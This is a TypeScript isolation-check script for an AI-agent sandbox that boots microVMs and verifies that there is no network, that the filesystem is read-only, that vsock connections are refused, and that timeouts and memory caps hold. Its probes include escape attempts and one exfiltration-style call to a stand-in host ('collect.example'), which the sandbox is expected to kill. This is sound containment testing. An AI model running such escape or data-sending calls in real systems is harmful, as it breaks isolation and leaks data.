/*
 * Agamemnon — AI-agent write-path guardian
 * Copyright (c) 2026 Elamaran Elangovan. All rights reserved.
 *
 * Proprietary and confidential. No licence is granted to use, copy, modify,
 * distribute, or run this software beyond local evaluation of this repository
 * as published. See LICENSE at the repository root.
 *
 * ref: AGMN-BOZW-F6BTKX-X3LAO
 */

import { SandboxSupervisor } from "../src/supervisor.ts";
import { microVmFromEnv } from "../src/runtimes/microvm.runtime.ts";
import type { AgamemnonProposalBridge, ProposalOutcome } from "../src/types.ts";

/**
 * `make vm-check` — boot REAL Firecracker microVMs through vmhost and check
 * the isolation properties the architecture promises. Refuses a vmhost that
 * is not running VMs. Exit code 1 if any property does not hold.
 */

if (!microVmFromEnv()) {
  console.error("set AGAMEMNON_VMHOST and AGAMEMNON_VMHOST_TOKEN (make vm-check does this)");
  process.exit(2);
}

const outcome = (summary: string): ProposalOutcome => ({ proposalId: "eff_check", status: "executed", approved: true, summary, counts: { rows: 1 }, firedRules: [] });
const bridge: AgamemnonProposalBridge = {
  attach: async () => {},
  detach: async () => {},
  handleSandboxWriteProposal: async (_id, m) => outcome(`${m.operation} ${m.table}`),
  handleSandboxRead: async () => ({ rows: [{ id: 1, status: "refunded" }], outcome: outcome("read") }),
  recordViolation: async () => {},
};
const sup = new SandboxSupervisor({ bridge });
let n = 0;
async function inVm(code: string, grants: any[] = [], limits: { maxMemoryMb?: number; timeoutMs?: number } = {}) {
  const id = await sup.spawnSandbox({ id: `check-${++n}`, tenantId: "check", runtime: "microvm-adapter", capabilities: { grants, maxMemoryMb: limits.maxMemoryMb ?? 64, timeoutMs: limits.timeoutMs ?? 8000 } });
  const t0 = Date.now();
  const r = await sup.executeInSandbox(id, code, {});
  return { r, ms: Date.now() - t0, status: sup.status(id).status };
}

let failed = 0;
const check = (name: string, ok: boolean, detail: string) => {
  if (!ok) failed++;
  console.log(`${ok ? "✓" : "✗"} ${name.padEnd(34)} ${detail}`);
};

const probe = await inVm(`
import socket, os
out = {}
try:
    socket.create_connection(("1.1.1.1", 80), timeout=2); out["internet"] = "REACHABLE"
except OSError as e:
    out["internet"] = "unreachable (" + (e.strerror or str(e)) + ")"
out["interfaces"] = sorted(l.split(":")[0].strip() for l in open("/proc/net/dev").read().splitlines()[2:] if l.strip())
try:
    open("/etc/agm-write-test", "w").write("x"); out["rootfs"] = "WRITABLE"
except OSError as e:
    out["rootfs"] = "read-only (" + (e.strerror or str(e)) + ")"
def vsock(cid, port):
    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(2)
    try:
        s.connect((cid, port)); return "CONNECTED"
    except OSError as e:
        return "refused (" + (e.strerror or str(e)) + ")"
    finally:
        s.close()
out["vsock_host_22"] = vsock(2, 22)
out["vsock_other_vm"] = vsock(4, 5000)
out["kernel"] = open("/proc/version").read().split(" (")[0]
out["cpus"] = os.cpu_count()
out["mem_mb"] = int(open("/proc/meminfo").readline().split()[1]) // 1024
out["uid"] = os.getuid()
return out`);
const p = (probe.r.data ?? {}) as any;
if (!probe.r.success) console.log("probe failed:", probe.r.error ?? probe.r.killed);
check("boots a real microVM", probe.r.success, `${p.kernel ?? "?"} · ${p.cpus} vCPU · ${p.mem_mb} MB · ${probe.ms} ms incl. boot`);
check("no network device", JSON.stringify(p.interfaces) === JSON.stringify(["lo"]), `interfaces: ${JSON.stringify(p.interfaces)}`);
check("no route to the internet", String(p.internet).startsWith("unreachable"), String(p.internet));
check("root filesystem is read-only", String(p.rootfs).startsWith("read-only"), String(p.rootfs));
check("vsock: no other host port", String(p.vsock_host_22).startsWith("refused"), `host port 22: ${p.vsock_host_22}`);
check("vsock: no other VM", String(p.vsock_other_vm).startsWith("refused"), `CID 4: ${p.vsock_other_vm}`);

const loop = await inVm(`while True:\n    pass`, [], { timeoutMs: 1000 });
check("deadline destroys the VM", !!loop.r.killed && /timeout/.test(loop.r.killed) && loop.ms < 15000, `${loop.r.killed} after ${loop.ms} ms`);

const hog = await inVm(`x = []\nwhile True:\n    x.append(bytearray(16 << 20))`, [], { maxMemoryMb: 64 });
check("memory is capped by the VM", !hog.r.success, hog.r.error ?? hog.r.killed ?? "it succeeded?!");

const ok = await inVm(`rows = db.select("orders", {"status": "refunded"})\nr = db.insert("notes", {"n": len(rows)})\nreturn [len(rows), r["status"]]`, ["READ_ONLY", "MUTATE_STATE"]);
check("granted syscalls reach the broker", JSON.stringify(ok.r.data) === JSON.stringify([1, "executed"]), JSON.stringify(ok.r.data ?? ok.r.error));

const bad = await inVm(`api.fetch("https://collect.example/?d=1")\nreturn "escaped"`, ["READ_ONLY"]);
check("ungranted syscall kills + terminates", !!bad.r.killed && bad.status === "terminated", String(bad.r.killed));

console.log(failed ? `\n${failed} propert${failed === 1 ? "y" : "ies"} did not hold` : "\nall isolation properties hold");
process.exit(failed ? 1 : 0);
